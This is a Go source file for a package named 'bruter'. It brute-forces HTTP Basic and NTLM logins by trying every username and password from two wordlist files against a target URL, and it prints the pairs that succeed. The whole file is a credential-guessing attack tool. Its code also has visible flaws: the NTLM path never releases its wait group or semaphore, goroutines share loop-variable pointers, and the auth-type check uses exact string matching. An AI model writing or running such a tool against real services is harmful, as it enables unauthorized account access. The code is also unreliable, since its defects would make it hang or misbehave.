package bruter

import (
	"bufio"
	"fmt"
	"github.com/vadimi/go-http-ntlm/v2"
	"log"
	"net/http"
	"os"
	"sync"
)

type Requester interface {
	sendRequest(username, password, url *string, wg *sync.WaitGroup, semaphore chan struct{})
}

type BasicAuthRequester struct{}

type NTLMAuthRequester struct {
	Domain string
}

func (bar BasicAuthRequester) sendRequest(username, password, url *string, wg *sync.WaitGroup, semaphore chan struct{}) {
	defer wg.Done()
	defer func() { <-semaphore }()

	req, err := http.NewRequest("GET", *url, nil)
	if err != nil {
		log.Printf("Request error: %v\n", err)
		return
	}
	req.SetBasicAuth(*username, *password)
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("HTTP request failed: %v\n", err)
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode == 200 {
		fmt.Printf("Tried %s:%s -> Status: %d\n", *username, *password, resp.StatusCode)
	}
}

func (ntlm NTLMAuthRequester) sendRequest(username, password, url *string, wg *sync.WaitGroup, semaphore chan struct{}) {
	client := http.Client{
		Transport: &httpntlm.NtlmTransport{
			Domain:   ntlm.Domain,
			User:     *username,
			Password: *password,
			// RoundTripper: &http.Transport{
			// 	TLSClientConfig: &tls.Config{},
			// },
		},
	}
	req, err := http.NewRequest("GET", *url, nil)
	if err != nil {
		log.Printf("Request error: %v\n", err)
		return
	}
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("HTTP request failed: %v\n", err)
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode == 200 {
		fmt.Printf("Tried %s:%s -> Status: %d\n", *username, *password, resp.StatusCode)
	}
}

func getRequester(url, domain *string) Requester {
	req, err := http.NewRequest("GET", *url, nil)
	if err != nil {
		log.Printf("Request error: %v\n", err)
		return nil
	}
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	authType := resp.Header.Get("Www-Authenticate")
	fmt.Println(authType)
	switch authType {
	case "Basic":
		return &BasicAuthRequester{}
	case "NTLM":
		return &NTLMAuthRequester{Domain: *domain}
	}
	return nil
}

func readFile(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	var values []string
	for scanner.Scan() {
		values = append(values, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}
	return values, nil
}

func Brute(usersFilePath, passwordsFilePath, url, domain *string, rate *int) {
	usersList, err := readFile(*usersFilePath)
	if err != nil {
		log.Fatalf("Failed to read users file: %v", err)
	}

	passwordsList, err := readFile(*passwordsFilePath)
	if err != nil {
		log.Fatalf("Failed to read passwords file: %v", err)
	}

	var wg sync.WaitGroup
	semaphore := make(chan struct{}, *rate)
	requester := getRequester(url, domain)
	if requester == nil {
		log.Fatal("No auth provided")
		return
	}
	for _, username := range usersList {
		for _, password := range passwordsList {
			semaphore <- struct{}{}
			wg.Add(1)
			go requester.sendRequest(&username, &password, url, &wg, semaphore)
		}
	}
	wg.Wait()
}
